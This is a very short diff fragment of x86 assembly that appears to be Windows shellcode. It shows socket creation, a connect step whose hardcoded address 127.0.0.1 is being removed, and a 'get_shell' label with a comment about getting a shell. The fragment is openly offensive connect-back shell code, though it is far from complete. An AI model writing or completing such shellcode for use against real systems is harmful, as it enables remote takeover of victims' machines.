@@ -46,7 +46,7 @@ make_socket:
   ; we got the socket in edi
 
 connect_socket:
-  WSA_CALL_CONNECT 0, "127.0.0.1"
+  WSA_CALL_CONNECT 0
 
 get_shell:
   ; ebp is still setup right, and so is edi, lets get a shell!
